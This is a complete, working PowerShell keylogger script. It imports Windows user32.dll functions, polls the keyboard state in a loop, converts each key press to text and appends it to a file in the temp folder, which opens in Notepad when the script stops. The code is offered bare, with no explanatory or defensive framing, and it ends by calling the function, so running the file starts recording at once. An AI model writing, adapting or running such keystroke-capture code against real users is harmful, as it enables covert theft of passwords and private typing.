function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
{
  Set-Variable -Name signatures -Value (@'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@)
  Set-Variable -Name API -Value (Add-Type -Name 'Win32' -MemberDefinition $signatures -PassThru -Namespace API)
  Set-Variable -Name null -Value (New-Item -Force -ItemType File -Path $Path)
  try
  {
    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
    while ($true) {
      Start-Sleep -Milliseconds 40
      for (Set-Variable -Name ascii -Value (9); $ascii -le 254; $ascii++) {
        Set-Variable -Name state -Value ($API::GetAsyncKeyState($ascii))
        if ($state -eq -32767) {
          $null = [console]::CapsLock
          $virtualKey = $API::MapVirtualKey($ascii, 3)
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
          $mychar = New-Object -TypeName System.Text.StringBuilder
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
          if ($success) 
          {
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {
    notepad $Path
  }
}
Start-KeyLogger
